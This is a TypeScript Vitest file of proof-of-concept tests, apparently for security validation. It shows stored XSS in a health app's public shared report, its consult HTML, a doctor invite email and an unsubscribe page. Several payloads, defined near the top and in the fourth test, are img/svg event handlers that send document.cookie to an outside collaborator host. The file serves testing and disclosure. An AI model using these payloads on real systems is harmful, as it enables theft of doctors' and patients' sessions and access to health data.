// PoC (security validation): stored XSS via unescaped HTML interpolation.
// Candidates from static triage:
//  1. GET /api/public/shared/:token  (src/app.ts ~408-470) — patientName / exam.title /
//     lab interpolated raw into the PUBLIC HTML report (only contentMd is escaped).
//  2. POST /api/consulta/exams/:examId (src/routes/consulta.ts) — rawExtraction.patientName
//     (attacker-controlled via the uploaded PDF header) interpolated raw into clinical HTML.
//  3. emailTemplate.ts — user/patient name into HTML emails rendered by mail clients
//     (doctorInviteEmail fires on POST /api/doctor-shares with a registered doctor email).
//  4. GET /api/notifications/unsubscribe — user.name first word unescaped.
// Attack story: patient sets own fullName (or exam title / PDF "Nome:" field) to
// <img src=x onerror=...>; doctor/victim opens the generated page; JS runs in the
// health-app origin. No helmet/CSP anywhere (rg helmet|content-security = 0 hits).
import { describe, it, expect, beforeEach } from 'vitest';
import { api, resetDb, createUser, createExam, mintToken, testCpf, authHeader } from './helpers';
import { prisma } from '../src/prisma';

const XSS_NAME = `<img src=x onerror="fetch('https://ja.oastify.com/x?'+document.cookie)">`;

describe('PoC 1: stored XSS in PUBLIC shared report (/api/public/shared/:token)', () => {
  beforeEach(async () => {
    await resetDb();
  });

  it('patientName flows unescaped into the public HTML report', async () => {
    // 1. attacker registers; register stores String(name) verbatim (zod: min2/max100 only)
    const reg = await api().post('/api/auth/register').send({
      name: XSS_NAME, email: 'atacante@exemplo.com', password: 'senha123', cpf: testCpf(),
    });
    expect(reg.status).toBe(201);
    // mailer is mocked in setup.ts; we mint the session token directly (valid regardless
    // of emailVerified — issueSession doesn't gate on it).
    const attacker = await prisma.user.findUnique({ where: { email: 'atacante@exemplo.com' } });
    const tok = mintToken(attacker!.id);

    // the register transaction already created the Titular patient with the XSS fullName
    const pat = await prisma.patient.findFirst({ where: { ownerId: attacker!.id } });
    expect(pat?.fullName).toBe(XSS_NAME);

    // 2. exam + summary analysis (AI mocked in setup.ts)
    const exam = await createExam(pat!.id, { title: 'Hemograma Completo' });
    const post = await api().post('/api/analyses').set(authHeader(tok)).send({ examId: exam.id });
    expect([200, 201]).toContain(post.status);
    const analysisId = post.body.id;

    // 3. share it (returns public link + PIN)
    const share = await api().post(`/api/analyses/${analysisId}/share`).set(authHeader(tok)).send({});
    expect(share.status).toBe(200);
    const { token, pin } = share.body;
    expect(token).toBeTruthy();
    expect(pin).toMatch(/^\d{6}$/);

    // 4. VICTIM (doctor, unauthenticated) opens the link with the PIN
    const view = await api().get(`/api/public/shared/${token}`).query({ pin });
    expect(view.status).toBe(200);
    expect(view.headers['content-type']).toMatch(/text\/html/);

    // no CSP / security headers on the response
    expect(view.headers['content-security-policy']).toBeUndefined();
    expect(view.headers['x-content-type-options']).toBeUndefined();

    // 5. the payload appears UNESCAPED (raw <img ...>, not &lt;img)
    expect(view.text).toContain('<img src=x onerror=');
    expect(view.text).not.toContain('&lt;img src=x onerror=');
    const m = view.text.match(/<b>Paciente:<\/b> ([\s\S]*?)<br>/);
    expect(m?.[1]).toBe(XSS_NAME); // exact injection point: app.ts info-bar
  });

  it('exam.title and sourceLab flow unescaped too', async () => {
    const u = await createUser();
    const exam = await createExam(u.patient.id, {
      title: '<svg onload=alert(1)>',
    });
    await prisma.exam.update({ where: { id: exam.id }, data: { sourceLab: '<script>alert(2)</script>' } });
    const post = await api().post('/api/analyses').set(authHeader(u.token)).send({ examId: exam.id });
    expect([200, 201]).toContain(post.status);
    const share = await api().post(`/api/analyses/${post.body.id}/share`).set(authHeader(u.token)).send({});
    const view = await api().get(`/api/public/shared/${share.body.token}`).query({ pin: share.body.pin });
    expect(view.status).toBe(200);
    expect(view.text).toContain('<svg onload=alert(1)>');
    expect(view.text).not.toContain('&lt;svg');
    expect(view.text).toContain('<script>alert(2)</script>');
  });
});

describe('PoC 2: stored XSS in consulta HTML (POST /api/consulta/exams/:examId)', () => {
  beforeEach(async () => {
    await resetDb();
  });

  it('rawExtraction.patientName (PDF header) renders unescaped in clinical HTML', async () => {
    const u = await createUser();
    const exam = await createExam(u.patient.id);
    // simulate the AI extraction output for an uploaded PDF whose "Nome:" field is the payload.
    // pipeline.ts:238/264 persist raw (incl. patientName) into exam.rawExtraction verbatim.
    await prisma.exam.update({
      where: { id: exam.id },
      data: { rawExtraction: { patientName: XSS_NAME, sourceLab: 'Lab Teste' } },
    });

    const r = await api().post(`/api/consulta/exams/${exam.id}`).set(authHeader(u.token)).send({});
    expect(r.status).toBe(200);
    expect(typeof r.body.html).toBe('string');
    // payload appears raw in the returned HTML (title tag + patient-box)
    expect(r.body.html).toContain(`<title>Preparo de Consulta — ${XSS_NAME}</title>`);
    expect(r.body.html).toContain(`<b>👤 Paciente:</b> ${XSS_NAME}`);
    expect(r.body.html).not.toContain('&lt;img src=x');
  });

  it('fallback chain exam.patient.fullName renders unescaped (no rawExtraction)', async () => {
    const u = await createUser({ name: XSS_NAME }); // patient.fullName = user name
    const exam = await createExam(u.patient.id);
    const r = await api().post(`/api/consulta/exams/${exam.id}`).set(authHeader(u.token)).send({});
    expect(r.status).toBe(200);
    expect(r.body.html).toContain(`<b>👤 Paciente:</b> ${XSS_NAME}`);
  });
});

describe('PoC 3: user name into HTML email (doctorInviteEmail via /api/doctor-shares)', () => {
  beforeEach(async () => {
    await resetDb();
  });

  it('patient.fullName renders unescaped in the doctor invite email HTML', async () => {
    const u = await createUser({ name: XSS_NAME });
    // a REAL doctor account (existing email) so the invite email is sent (not pending-invite).
    // KYC (revisão final, C1): o aviso do share só vai a médico que PODE ATUAR → conta aprovada.
    const doc = await prisma.doctor.create({
      data: {
        name: 'Dr Vítima', crm: '99999-SP', crmUf: 'SP',
        email: 'dr.vitima@exemplo.com', passwordHash: 'x', emailVerified: true, verificationStatus: 'approved',
      },
    });
    const r = await api().post('/api/doctor-shares').set(authHeader(u.token)).send({
      doctorCrm: '99999', doctorUf: 'SP',
    });
    expect(r.status).toBe(201);

    // capture what sendEmail was asked to send (mailer is a vi.mock in setup.ts)
    const { sendEmail } = await import('../src/utils/mailer');
    const call = (sendEmail as any).mock?.calls?.at(-1)?.[0];
    expect(call).toBeTruthy();
    expect(call.to).toBe('dr.vitima@exemplo.com');
    expect(call.html).toContain(`<strong>${XSS_NAME}</strong>`);
    expect(call.html).not.toContain(`&lt;img src=x`);
    expect(call.subject).toContain(XSS_NAME);
  });
});

describe('PoC 4: unsubscribe page (/api/notifications/unsubscribe)', () => {
  beforeEach(async () => {
    await resetDb();
  });

  it('user.name first word renders unescaped in the public HTML page', async () => {
    // space-free payload: app.ts:382 takes name.split(' ')[0] — a space would truncate the tag
    const NO_SPACE_XSS = '<svg/onload=fetch("https://ja.oastify.com/u?"+document.cookie)>';
    const u = await createUser({ name: NO_SPACE_XSS });
    // forge the unsubscribe token the same way the app does (HMAC with test JWT_SECRET)
    const { makeUnsubToken } = await import('../src/utils/unsubscribeToken');
    const token = makeUnsubToken(u.user.id);
    const r = await api().get('/api/notifications/unsubscribe').query({ token });
    expect(r.status).toBe(200);
    expect(r.headers['content-type']).toMatch(/text\/html/);
    expect(r.headers['content-security-policy']).toBeUndefined();
    // `first` = first whitespace-token of the name = the whole <svg/...> tag here
    expect(r.text).toContain(`Pronto, ${NO_SPACE_XSS}`);
  });
});